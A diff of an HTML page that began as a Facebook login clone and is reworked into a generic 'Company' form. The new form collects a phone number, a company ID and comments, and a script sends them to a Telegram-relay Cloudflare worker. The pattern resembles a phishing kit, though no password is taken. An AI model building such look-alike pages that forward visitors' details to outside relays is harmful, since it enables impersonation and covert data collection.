@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook - log in or sign up</title>
+  <title>Company</title>
   <style>
     body {
       background-color: #f0f2f5;
@@ -58,7 +59,8 @@
       font-size: 16px;
       box-sizing: border-box;
     }
-    .login-card input:focus {
+    .login-card input:focus,
+    .login-card textarea:focus {
       outline: none;
       border-color: #1877f2;
       box-shadow: 0 0 0 2px #e7f3ff;
@@ -107,6 +109,26 @@
     .create-btn:hover {
       background-color: #36a420;
     }
+
+    .login-card textarea {
+      width: 100%;
+      min-height: 85px;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+      font-family: inherit;
+      resize: vertical;
+    }
+    .status {
+      font-size: 14px;
+      margin: 12px 0;
+      color: #1877f2;
+      overflow-wrap: anywhere;
+    }
+
     @media (max-width: 820px) {
       .container {
         flex-direction: column;
@@ -124,21 +146,120 @@
   <div class="container">
     <div class="brand-section">
       <h1 class="fb-title">Company</h1>
-      <p class="fb-subtitle">"Innovation distinguishes between a leader and a follower." </p>
+      <p class="fb-subtitle">"Innovation distinguishes between a leader and a follower."</p>
     </div>
 
     <div class="login-card">
-      <form action="#" method="POST">
-        <input type="text" name="email" placeholder="Email or phone number" required>
-        <input type="password" name="password" placeholder="Company ID" required>
-        <button type="submit" class="login-btn">send</button>
+
+      <form id="employeeForm">
+        <input
+          type="tel"
+          id="phone"
+          placeholder="Phone Number"
+          required
+        >
+
+        <input
+          type="text"
+          id="companyId"
+          placeholder="Company ID (name or number)"
+          required
+        >
+
+        <button type="submit" class="login-btn">Send</button>
       </form>
+
+      <p id="employeeStatus" class="status"></p>
+
       <a href="#" class="forgot-link">visit page?</a>
       <div class="divider"></div>
       <a href="#" class="create-btn">Create Company id</a>
+
+      <div class="divider"></div>
+
+      <form id="commentForm">
+        <textarea
+          id="comment"
+          placeholder="Comment"
+          required
+        ></textarea>
+
+        <button type="submit" class="login-btn">Send Comment</button>
+      </form>
+
+      <p id="commentStatus" class="status"></p>
+
     </div>
   </div>
 
+<script>
+const WORKER_URL =
+"https://company-message-telegram.adonayyemane153.workers.dev";
+
+async function sendToTelegram(data) {
+  const response = await fetch(WORKER_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  });
+
+  if (!response.ok) {
+    throw new Error("Sending failed");
+  }
+
+  return response;
+}
+
+document.getElementById("employeeForm")
+.addEventListener("submit", async function(event) {
+  event.preventDefault();
+
+  const phone = document.getElementById("phone").value.trim();
+  const companyId = document.getElementById("companyId").value.trim();
+  const status = document.getElementById("employeeStatus");
+
+  status.textContent = "Sending...";
+
+  try {
+    await sendToTelegram({
+      action: "employee",
+      phone: phone,
+      companyId: companyId
+    });
+
+    status.textContent = "Details sent successfully!";
+    this.reset();
+
+  } catch (error) {
+    status.textContent = "Sending failed. Please try again.";
+  }
+});
+
+document.getElementById("commentForm")
+.addEventListener("submit", async function(event) {
+  event.preventDefault();
+
+  const comment = document.getElementById("comment").value.trim();
+  const status = document.getElementById("commentStatus");
+
+  status.textContent = "Sending...";
+
+  try {
+    await sendToTelegram({
+      action: "comment",
+      comment: comment
+    });
+
+    status.textContent = "Comment sent successfully!";
+    this.reset();
+
+  } catch (error) {
+    status.textContent = "Sending failed. Please try again.";
+  }
+});
+</script>
+
 </body>
 </html>
-
